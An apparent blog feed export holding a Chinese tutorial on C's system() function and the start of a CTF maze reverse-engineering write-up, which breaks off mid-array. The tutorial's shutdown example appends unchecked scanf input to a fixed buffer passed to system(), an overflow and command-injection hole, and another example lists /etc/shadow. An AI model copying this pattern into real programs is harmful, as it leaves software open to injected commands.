    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>执行 dos(windows系统) 或 shell(Linux&#x2F;Unix系统) 命令，参数字符串command为命令名。另，在windows系统下参数字符串不区分大小写。</p><p>说明：在windows系统中，system函数直接在控制台调用一个command命令。<br>在Linux&#x2F;Unix系统中，system函数会</p><p>1.fork一个子进程；</p><p>2.在子进程中调用exec函数去执行command；</p><p>3.在父进程中调用wait去等待子进程结束。</p><h5 id="官方文档"><a href="#官方文档" class="headerlink" title="官方文档"></a>官方文档</h5><p><a href="https://docs.microsoft.com/zh-cn/cpp/c-language/system-function?view=msvc-170">https://docs.microsoft.com/zh-cn/cpp/c-language/system-function?view=msvc-170</a></p><h5 id="相关函数："><a href="#相关函数：" class="headerlink" title="相关函数："></a>相关函数：</h5><p>fork, execve, waitpid, popen</p><h5 id="头文件："><a href="#头文件：" class="headerlink" title="头文件："></a>头文件：</h5><p>#include &lt;stdlib.h&gt;   &#x2F;&#x2F;standard library  标准库头文件</p><h5 id="定义函数："><a href="#定义函数：" class="headerlink" title="定义函数："></a>定义函数：</h5><p>int system(const char * string);</p><h5 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h5><p>命令执行成功返回0</p><p>1、如果 system()在调用&#x2F;bin&#x2F;sh 时失败则返回127, 其他失败原因返回-1.。</p><p>2、若参数string 为空指针(NULL), 则返回非零值.</p><p>3、如果system()调用成功则最后会返回执行shell 命令后的返回值, 但是此返回值也有可能为system()调用&#x2F;bin&#x2F;sh 失败所返回的127, 因此最好能再检查errno 来确认执行成功.</p><h5 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  system(<span class="hljs-string">&quot;ls -al /etc/passwd /etc/shadow&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br> <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdlib&gt;</span></span><br> <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br> <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"> </span>&#123;<br>   cout &lt;&lt; <span class="hljs-string">&quot;Hello world&quot;</span> &lt;&lt; endl;<br>   <span class="hljs-built_in">system</span> (<span class="hljs-string">&quot;pause&quot;</span>);<br>   <span class="hljs-built_in">system</span> (<span class="hljs-string">&quot;cls&quot;</span>);<br>   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br> &#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">print</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; ╪╪╪╪╪╪╧╧╧╧╧╧╧╧╪╪╪╪╪╪\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;╔═══╧╧C语言关机程序 ╧╧═══╗\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;║※1.实现10分钟内的定时关闭计算机 ║\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;║※2.立即关闭计算机　       ║\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;║※3.注销计算机　         ║\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;║※0.退出系统　          ║\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;╚═════════════════╝\n&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>  system(<span class="hljs-string">&quot;title C语言关机程序&quot;</span>);<span class="hljs-comment">//设置cmd窗口标题</span><br>  system(<span class="hljs-string">&quot;mode con cols=48 lines=25&quot;</span>);<span class="hljs-comment">//窗口宽度高度</span><br>  system(<span class="hljs-string">&quot;color 0B&quot;</span>);<br>  system(<span class="hljs-string">&quot;date /T&quot;</span>);<br>  system(<span class="hljs-string">&quot;TIME /T&quot;</span>);<br>  <span class="hljs-type">char</span> cmd[<span class="hljs-number">20</span>]=<span class="hljs-string">&quot;shutdown -s -t &quot;</span>;<br>  <span class="hljs-type">char</span> t[<span class="hljs-number">5</span>]=<span class="hljs-string">&quot;0&quot;</span>;<br>  print();<br>  <span class="hljs-type">int</span> c;<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;c);<br>  getchar();<br>  <span class="hljs-keyword">switch</span>(c)<br>  &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;您想在多少秒后自动关闭计算机？（0~600）\n&quot;</span>);<span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,t);<br>    system(<span class="hljs-built_in">strcat</span>(cmd,t));<span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:system(<span class="hljs-string">&quot;shutdown -p&quot;</span>);<span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:system(<span class="hljs-string">&quot;shutdown -l&quot;</span>);<span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error!\n&quot;</span>);<br>  &#125;<br>  system(<span class="hljs-string">&quot;pause&quot;</span>);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="help-command"><a href="#help-command" class="headerlink" title="help  command"></a>help  command</h3><h5 id="查看命令的说明手册，可以用这个命令查看附录中和其他命令的用法，其它命令不一一列举"><a href="#查看命令的说明手册，可以用这个命令查看附录中和其他命令的用法，其它命令不一一列举" class="headerlink" title="查看命令的说明手册，可以用这个命令查看附录中和其他命令的用法，其它命令不一一列举"></a>查看命令的说明手册，可以用这个命令查看附录中和其他命令的用法，其它命令不一一列举</h5><h3 id="color-XX"><a href="#color-XX" class="headerlink" title="color XX"></a>color XX</h3><p>改变控制台背景和字体颜色</p><p>参数是两个16进制数，第一位对应字体（前景）颜色，第二位对应背景颜色</p><p> 0 &#x3D; 黑色       8 &#x3D; 灰色<br>    1 &#x3D; 蓝色       9 &#x3D; 淡蓝色<br>    2 &#x3D; 绿色       A &#x3D; 淡绿色<br>    3 &#x3D; 浅绿色     B &#x3D; 淡浅绿色<br>    4 &#x3D; 红色       C &#x3D; 淡红色<br>    5 &#x3D; 紫色       D &#x3D; 淡紫色<br>    6 &#x3D; 黄色       E &#x3D; 淡黄色<br>    7 &#x3D; 白色       F &#x3D; 亮白色</p><h3 id="system-”文件路径“"><a href="#system-”文件路径“" class="headerlink" title="system(”文件路径“)"></a>system(”文件路径“)</h3><p>打开&#x2F;运行一个文件</p><p>遇到文件名带空格时</p><p>加\转意</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">system(<span class="hljs-string">&quot;\&quot;C:\\Program Files (x86)\\Netease\\CloudMusic\\cloudmusic.exe\&quot;&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="tips"><a href="#tips" class="headerlink" title="tips:"></a>tips:</h3><h5 id="devc-中"><a href="#devc-中" class="headerlink" title="devc++中"></a>devc++中</h5><p>dir,cls,color等由于是解释器内部的命令可以直接c语言system()执行而help,tree等则会显示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">help</span><span class="hljs-string">&#x27; 不是内部或外部命令，也不是可运行的程序</span><br><span class="hljs-string">或批处理文件。</span><br></code></pre></td></tr></table></figure><p>使用绝对路径如system(“C:\Windows\System32\help”);就能正常运行</p><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p>一些system()函数的参数及实现的功能<br>表格里的内容可以通过 system(“HELP”);语句获取。</p><p>参数功能说明<br>ASSOC显示或修改文件扩展名关联<br>ATTRIB显示或更改文件属性<br>BREAK设置或清除扩展式 CTRL+C 检查<br>BCDEDIT设置启动数据库中的属性以控制启动加载<br>CACLS显示或修改文件的访问控制列表(ACL)<br>CALL从另一个批处理程序调用这一个<br>CD显示当前目录的名称或将其更改<br>CHCP显示或设置活动代码页数<br>CHDIR显示当前目录的名称或将其更改<br>CHKDSK检查磁盘并显示状态报告<br>CHKNTFS显示或修改启动时间磁盘检查<br>CLS清除屏幕*<br>CMD打开另一个 Windows 命令解释程序窗口*<br>COLOR设置默认控制台前景和背景颜色*<br>COMP比较两个或两套文件的内容<br>COMPACT显示或更改 NTFS 分区上文件的压缩<br>CONVERT将 FAT 卷转换成 NTFS 你不能转换当前驱动器<br>COPY将至少一个文件复制到另一个位置<br>DATE显示或设置日期后面加 &#x2F;t 表示显示日期<br>DEL删除至少一个文件<br>DIR显示一个目录中的文件和子目录<br>DISKPART显示或配置磁盘分区属性<br>DOSKEY编辑命令行、撤回 Windows 命令并创建宏<br>DRIVERQUERY显示当前设备驱动程序状态和属性<br>ECHO显示消息，或将命令回显打开或关闭<br>ENDLOCAL结束批文件中环境更改的本地化<br>ERASE删除一个或多个文件*<br>EXIT退出 CMD.EXE 程序(命令解释程序)*<br>FC比较两个文件或两个文件集并显示它们之间的不同*<br>FIND在一个或多个文件中搜索一个文本字符串*<br>FINDSTR在多个文件中搜索字符串*<br>FOR为一组文件中的每个文件运行一个指定的命令<br>FORMAT格式化磁盘，以便用于 Windows<br>FSUTIL显示或配置文件系统属性<br>FTYPE显示或修改在文件扩展名关联中使用的文件类型<br>GOTO将 Windows 命令解释程序定向到批处理程序中某个带标签的行<br>GPRESULT显示计算机或用户的组策略信息<br>GRAFTABL使 Windows 在图形模式下显示扩展字符集*<br>HELP提供 Windows 命令的帮助信息<br>ICACLS显示、修改、备份或还原文件和目录的 ACL<br>IF在批处理程序中执行有条件的处理操作<br>LABEL创建、更改或删除磁盘的卷标<br>MD创建一个目录<br>MKDIR创建一个目录<br>MKLINK创建符号链接和硬链接<br>MODE配置系统设备<br>MORE逐屏显示输出*<br>MOVE将一个或多个文件从一个目录移动到另一个目录<br>OPENFILES显示远程用户为了文件共享而打开的文件<br>PATH为可执行文件显示或设置搜索路径<br>PAUSE暂停批处理文件的处理并显示消息<br>POPD还原通过 PUSHD 保存的当前目录的上一个值<br>PRINT打印一个文本文件<br>PROMPT更改 Windows 命令提示<br>PUSHD保存当前目录，然后对其进行更改<br>RD删除目录<br>RECOVER从损坏的或有缺陷的磁盘中恢复可读信息*<br>REM记录批处理文件或 CONFIG.SYS 中的注释(批注)<br>REN重命名文件<br>RENAME重命名文件<br>REPLACE替换文件*<br>RMDIR删除目录<br>ROBOCOPY复制文件和目录树的高级实用工具<br>SET显示、设置或删除 Windows 环境变量<br>SETLOCAL开始本地化批处理文件中的环境更改<br>SC显示或配置服务(后台进程)<br>SCHTASKS安排在一台计算机上运行命令和程序<br>SHIFT调整批处理文件中可替换参数的位置<br>SHUTDOWN允许通过本地或远程方式正确关闭计算机<br>SORT对输入排序<br>START启动单独的窗口以运行指定的程序或命令<br>SUBST将路径与驱动器号关联<br>SYSTEMINFO显示计算机的特定属性和配置<br>TASKLIST显示包括服务在内的所有当前运行的任务<br>TASKKILL中止或停止正在运行的进程或应用程序<br>TIME显示或设置系统时间后面加 &#x2F;t 表示显示时间<br>TITLE设置 CMD.EXE 会话的窗口标题“TITLE 你想改成啥”<br>TREE以图形方式显示驱动程序或路径的目录结构“TREE D:”<br>TYPE显示文本文件的内容“TYPE D:\文本.txt”<br>VER显示 Windows 的版本<br>VERIFY告诉 Windows 是否进行验证，以确保文件正确写入磁盘<br>VOL显示磁盘卷标和序列号<br>XCOPY复制文件和目录树<br>WMIC在交互式命令 shell 中显示 WMI 信息</p>]]></content>
    
    
    <categories>
      
      <category>basic</category>
      
    </categories>
    
    
    <tags>
      
      <tag>c语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ACTF新生赛2020_Oruga</title>
    <link href="/2022/09/09/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-Oruga/"/>
    <url>/2022/09/09/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-Oruga/</url>
    
    <content type="html"><![CDATA[<p>知识点：迷宫题</p><p>题目显式或隐式地给出一个迷宫，定义在迷宫中移动对应的符号，通过走迷宫的形式得到flag</p><p>难点：</p><p>1.意识到这是一道迷宫题，考验代码分析能力和经验。</p><p>2.分析迷宫的类型，将迷宫还原，需要抽象思维。</p><p>3.分析在迷宫中的动作的执行规则</p><p>题目主函数</p><p><img src="/2022/09/09/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-Oruga/1.png" alt="1"></p><p>首先检测了flag格式，不对则输出”Format false!“格式错误</p><p>然后查看sub_78A函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c">_BOOL8 __fastcall <span class="hljs-title function_">sub_78A</span><span class="hljs-params">(__int64 input_addr)</span><br>&#123;<br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+Ch] [rbp-Ch]</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+10h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+14h] [rbp-4h]</span><br><br>  v2 = <span class="hljs-number">0</span>;<br>  v3 = <span class="hljs-number">5</span>;<br>  v4 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> ( byte_201020[v2] != <span class="hljs-number">0x21</span> )<br>  &#123;<br>    v2 -= v4;<span class="hljs-comment">//重复动作的时候会多做一次走到障碍物上，所以每次循环都要回退一步</span><br>    <span class="hljs-keyword">if</span> ( *(_BYTE *)(v3 + input_addr) != <span class="hljs-string">&#x27;W&#x27;</span> || v4 == <span class="hljs-number">-16</span> )<span class="hljs-comment">// 上</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ( *(_BYTE *)(v3 + input_addr) != <span class="hljs-string">&#x27;E&#x27;</span> || v4 == <span class="hljs-number">1</span> )<span class="hljs-comment">// 右</span><br>      &#123;<br>        <span class="hljs-keyword">if</span> ( *(_BYTE *)(v3 + input_addr) != <span class="hljs-string">&#x27;M&#x27;</span> || v4 == <span class="hljs-number">16</span> )<span class="hljs-comment">// 下</span><br>        &#123;<br>          <span class="hljs-keyword">if</span> ( *(_BYTE *)(v3 + input_addr) != <span class="hljs-string">&#x27;J&#x27;</span> || v4 == <span class="hljs-number">-1</span> )<span class="hljs-comment">// 左</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>          v4 = <span class="hljs-number">-1</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>          v4 = <span class="hljs-number">16</span>;<br>        &#125;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        v4 = <span class="hljs-number">1</span>;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      v4 = <span class="hljs-number">-16</span>;<br>    &#125;<br>    ++v3;<br>      <span class="hljs-comment">/*上方代码读取动作，下方代码重复读取的动作直到碰到障碍物，但是不能越界*/</span><br>    <span class="hljs-keyword">while</span> ( !byte_201020[v2] )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v4 == <span class="hljs-number">-1</span> &amp;&amp; (v2 &amp; <span class="hljs-number">0xF</span>) == <span class="hljs-number">0</span> )<span class="hljs-comment">//16的倍数，左边界越界</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>      <span class="hljs-keyword">if</span> ( v4 == <span class="hljs-number">1</span> &amp;&amp; v2 % <span class="hljs-number">16</span> == <span class="hljs-number">15</span> )<span class="hljs-comment">//右边界越界</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>      <span class="hljs-keyword">if</span> ( v4 == <span class="hljs-number">16</span> &amp;&amp; (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(v2 - <span class="hljs-number">240</span>) &lt;= <span class="hljs-number">0xF</span> )<span class="hljs-comment">//动作是向下并且到了最后一行，越界</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>      <span class="hljs-keyword">if</span> ( v4 == <span class="hljs-number">-16</span> &amp;&amp; (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(v2 + <span class="hljs-number">15</span>) &lt;= <span class="hljs-number">0x1E</span> )<span class="hljs-comment">//动作是向上并且到了第一行</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>      v2 += v4;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> *(_BYTE *)(v3 + input_addr) == <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>查看byte_201020</p><p><img src="/2022/09/09/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-Oruga/2.png" alt="2"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">maze=[<span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x23&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x23&#x27;</span>, <span class="hljs-string">&#x27;0x23&#x27;</span>, <span class="hljs-string">&#x27;0x23&#x27;</span>, <span class="hljs-string">&#x27;0x23&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x23&#x27;</span>, <span class="hljs-string">&#x27;0x23&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4f&#x27;</span>, <span class="hljs-string">&#x27;0x4f&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4f&#x27;</span>, <span class="hljs-string">&#x27;0x4f&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x50&#x27;</span>, <span class="hljs-string">&#x27;0x50&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4c&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4f&#x27;</span>, <span class="hljs-string">&#x27;0x4f&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4f&#x27;</span>, <span class="hljs-string">&#x27;0x4f&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x50&#x27;</span>, <span class="hljs-string">&#x27;0x50&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4c&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4f&#x27;</span>, <span class="hljs-string">&#x27;0x4f&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4f&#x27;</span>, <span class="hljs-string">&#x27;0x4f&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x50&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4c&#x27;</span>, <span class="hljs-string">&#x27;0x4c&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4f&#x27;</span>, <span class="hljs-string">&#x27;0x4f&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x50&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4f&#x27;</span>, <span class="hljs-string">&#x27;0x4f&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x50&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x23&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x23&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x4d&#x27;</span>, <span class="hljs-string">&#x27;0x4d&#x27;</span>, <span class="hljs-string">&#x27;0x4d&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x0&#x27;</span>, <span 